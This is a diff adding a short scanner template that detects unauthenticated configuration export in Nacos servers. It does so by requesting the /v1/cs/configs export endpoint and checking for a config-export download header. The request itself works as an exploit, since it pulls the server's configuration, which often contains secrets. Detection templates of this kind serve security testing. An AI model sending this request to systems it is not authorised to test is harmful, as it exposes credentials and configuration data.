@@ -1,0 +1,17 @@
+id: nacos-unauthorized-config-download
+
+info:
+  name: Nacos 未授权下载配置信息
+  author: zan8in
+  severity: high
+  verified: true
+  tags: nacos,unauthorized
+  created: 2024/06/03
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId=
+    expression: response.status == 200 && response.headers["content-disposition"].icontains("nacos_config_export_")
+expression: r0()
